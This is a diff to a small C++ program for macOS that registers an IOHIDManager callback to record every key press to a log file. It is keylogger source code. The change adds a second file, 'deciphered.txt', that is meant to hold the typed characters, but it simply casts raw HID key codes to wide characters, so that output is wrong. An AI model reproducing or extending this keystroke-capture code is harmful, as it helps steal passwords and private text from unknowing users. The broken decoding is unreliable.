@@ -1,6 +1,8 @@
 #include <iostream>
 #include <fstream>
 #include <IOKit/hid/IOHIDManager.h>
+#include <locale>
+#include <codecvt>
 
 void handleKeyPressCallback(void* context, IOReturn result, void* sender, IOHIDValueRef value) {
     IOHIDElementRef element = IOHIDValueGetElement(value);
@@ -17,6 +19,17 @@ void handleKeyPressCallback(void* context, IOReturn result, void* sender, IOHIDV
 
     // Close the log file
     logfile.close();
+
+    // Decipher and write the key to the deciphered file
+    std::wofstream decipheredFile;
+    decipheredFile.open("deciphered.txt", std::ios::app);
+
+    wchar_t character = static_cast<wchar_t>(keyCode);
+    decipheredFile.imbue(std::locale(decipheredFile.getloc(), new std::codecvt_utf8<wchar_t>));
+    decipheredFile << "Deciphered: " << character << std::endl;
+
+    // Close the deciphered file
+    decipheredFile.close();
 }
 
 int main() {
